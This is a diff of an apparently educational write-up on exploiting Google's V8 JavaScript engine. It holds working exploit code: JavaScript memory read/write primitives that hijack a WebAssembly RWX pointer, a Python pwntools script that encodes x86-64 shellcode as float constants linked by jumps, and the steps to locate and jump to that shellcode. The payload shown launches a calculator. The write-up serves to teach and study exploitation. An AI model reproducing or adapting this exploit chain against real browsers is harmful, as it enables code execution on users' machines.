@@ -91,8 +91,157 @@ const importObject = {
  imports: {imported_func : Math.sin},
 };
 
-var code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x00, 0x01, 0x7f, 0x02, 0x1b, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x08, 0x6a, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x33, 0x00, 0x00, 0x02, 0x6a, 0x73, 0x03, 0x74, 0x62, 0x6c, 0x01, 0x70, 0x00, 0x02, 0x03, 0x05, 0x04, 0x01, 0x01, 0x00, 0x00, 0x07, 0x10, 0x02, 0x06, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x32, 0x00, 0x03, 0x03, 0x70, 0x77, 0x6e, 0x00, 0x04, 0x09, 0x08, 0x01, 0x00, 0x41, 0x00, 0x0b, 0x02, 0x01, 0x02, 0x0a, 0x18, 0x04, 0x04, 0x00, 0x41, 0x2a, 0x0b, 0x05, 0x00, 0x41, 0xd3, 0x00, 0x0b, 0x04, 0x00, 0x41, 0x10, 0x0b, 0x06, 0x00, 0x41, 0x10, 0x10, 0x00, 0x0b]);
+var code = new Uint8Array([0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0a, 0x02, 0x60, 0x01, 0x7f, 0x01, 0x7f, 0x60, 0x00, 0x01, 0x7f, 0x02, 0x1b, 0x02, 0x03, 0x65, 0x6e, 0x76, 0x08, 0x6a, 0x73, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x33, 0x00, 0x00, 0x02, 0x6a, 0x73, 0x03, 0x74, 0x62, 0x6c, 0x01, 0x70, 0x00, 0x02, 0x03, 0x05, 0x04, 0x01, 0x01, 0x00, 0x00, 0x07, 0x10, 0x02, 0x06, 0x74, 0x69, 0x6d, 0x65, 0x73, 0x32, 0x00, 0x03, 0x03, 0x70, 0x77, 0x6e, 0x00, 0x04, 0x09, 0x08, 0x01, 0x00, 0x41]);
 var module = new WebAssembly.Module(code);
 var instance = new WebAssembly.Instance(module, importObject);
 var shellcode = instance.exports.func1;
+
+var instance_addr = addrOf(instance);
+var targets_ptr = (heap_read(instance_addr + 0x20n) & 0xffffffffn);
+var target_rwx = targets_ptr + 0x8n;
+var orignal_rwx_address = heap_read(target_rwx);
+console.log('targets_ptr ' + ToHex(targets_ptr));
+console.log('instance_addr ' + ToHex(instance_addr));
+console.log('target_rwx ' + ToHex(target_rwx));
+console.log('orignal_rwx_address ' + ToHex(orignal_rwx_address));
+
+heap_write(target_rwx,0x42424242n);
+
 ```
+Process crash confirms new address as target
+
+![image](https://github.com/user-attachments/assets/2fd029fa-88ee-44a1-9ac6-7c34228d5f22)
+
+## Insert shellcode in WebAssembly module
+
+Now we need to find a way to inject shellcode. RWX memory pages have write protection, to bypass this shellcode is injected inside WebAssembly module, then look for the offset where shellcode starts and redirect the execution of the imported function.
+To achieve this shellcode must be written as floating-point numbers, we must use the 8-byte structure commonly used for representing floating-point values to directly encode our shellcode instructions. By embedding these instructions within the V8 isolated heap memory in the form of ‘floating-number shaped shellcode’, they will be converted into the required shellcode assembly instructions inside the RWX memory page of the WASM module.
+We’ll then have to link these encoded instructions together using short jump commands, creating a more reliable exploit strategy
+To write assembly instructions as float will use pwntools and python to do the conversion, This method is taken from Matto Malvica explained here
+https://www.matteomalvica.com/blog/2024/06/05/intro-v8-exploitation-magle
+
+### Writing shellcode as float
+First, we will write our desired shellcode and convert it to float
+
+Python code to convert shellcode https://starlabs.sg/blog/2022/12-deconstructing-and-exploiting-cve-2020-6418/
+
+```python
+sc = '''int3
+	mov r15, [rsp+0x38]
+	push 0x5D7F236
+	pop r14
+	add r15, r14
+        mov r13, [r15]   
+	push 0x57D70
+	pop r12
+        add r13, r12
+        push 0x68AD0
+	push 0x0
+	pop rcx
+	push 0x636C6163
+	pop rdx
+	shl rcx, 0x20
+	add rcx, rdx
+	xor rdx, rdx
+	push rcx
+	mov rcx, rsp
+	inc rdx
+        call r13
+'''
+
+def packshellcode(sc, n):  # packs shellcode into n-byte blocks
+	ret = []
+	cur = b""
+	for line in sc.splitlines():
+		k = asm(line)
+		print("line {} ---- asm {} ---- len {}".format(line,k,len(k)))
+		assert(len(k) <= n)
+		if (len(cur) + len(k) <= n):
+			cur += k
+		else:
+			ret += [cur.ljust(6,b"\x90")] # pad with NOPs
+			cur = k
+			
+	ret += [cur.ljust(6,b"\x90")]
+	return ret
+
+SC = packshellcode(sc, 6)
+
+# Ensure no repeat of 6 byte blocks
+#D = dict(zip(SC, [SC.count(x) for x in SC]));
+#assert(max(D.values()) == 1)
+
+jmp = b'\xeb'
+
+
+jump_len = [b'\x07']*len(SC)
+for i in range(7,len(SC)):
+	jump_len[i] = b'\x0c'
+print(jump_len)
+# After 16 jumps the instruction size of the vmovsd becomes 7 bytes from 4 bytes
+# (4 bytes used instead of 1 byte to represent immediate larger than 0x7f)
+#jump_len[4:] = [b'\x09'] * len(jump_len[4:]) 
+
+SC = [(x + jmp + y) for x,y in zip(SC, jump_len)] # add jumps after each 6 byte block
+
+SC = [struct.unpack('<d', x)[0] for x in SC] # represent as doubles
+
+float1 = ''
+drop = 0
+for i in SC:
+    drop += 1
+    float1 += "f64.const {}\r\n".format(i)
+    #print("f64.const {}".format(i))
+for i in range(1,drop):
+	if ( i == drop-1):
+		print('aaa')
+		float1 += "drop"
+	else:
+		float1 += "drop\r\n"
+
+print(float1)
+```
+![image](https://github.com/user-attachments/assets/2de89476-2348-49a8-ab0b-1e295afa9915)
+Next we will write the output of shellcode.py as .wat file 
+Test.wat
+![image](https://github.com/user-attachments/assets/c1fb21b0-83be-426a-870f-d3d4c9579eaf)
+
+Convert it to Uint8Array
+```bash
+wat2wasm "test.wat" -o /tmp/ex.wasm
+xxd -i /tmp/ex.wasm | grep 0x | tr -d \\n
+```
+
+![image](https://github.com/user-attachments/assets/0f4bc0ab-cab5-48a8-8b4c-127ec8e4206c)
+
+Output is the hex value of test.wat, this is used as the Uint8Array to generate WASM with our shellcode
+![image](https://github.com/user-attachments/assets/36d1b9e4-53a8-4e7f-881a-a0e255529493)
+
+## Find shellcode offset inside WASM rwx memory page
+
+Once we have our shellcode as float inside the WebAssembly module we can find the offset in the debugger.
+The RWX address if at offset 0x48 from the WASM module (this might differ from different v8 versions, the offset can be found debugging d8)
+At addrof(wasm) + 0x48 we have the RWX address, then look for the shellcode offset by inspecting memory from RWX address looking for the first ```mov r10``` instruction.
+Inspect the RWX address
+
+![image](https://github.com/user-attachments/assets/379427aa-bfaa-48dd-99b5-da7838e34fda)
+
+Inspect the jmp instruction address
+
+![image](https://github.com/user-attachments/assets/2e60ad81-75f6-40b2-ad5f-a128d130bf25)
+
+The first mov r10 instruction is at address 0x21ea4a1c1b58, the offset is ```address of mov r10``` – ```RWX address```
+0x21ea4a1c1b58 - 0x21ea4a1c1000 = 0xb58
+Shellcode offset  = 0xb58 + 2n
+
+```javascript
+var instance_addr_0 = addrOf(wasm_instance_0);
+var rwx_0 = heap_read64(instance_addr_0 + 0x48n);
+var shellcode_0 = rwx_0 + 0xb58n +2n;
+
+console.log('instance_addr_0 ' + ToHex(instance_addr_0));
+console.log('rwx_0 ' + ToHex(rwx_0));
+console.log('shellcode_0 ' + ToHex(shellcode_0));
+heap_write64(target_rwx, shellcode_0);
+```
+
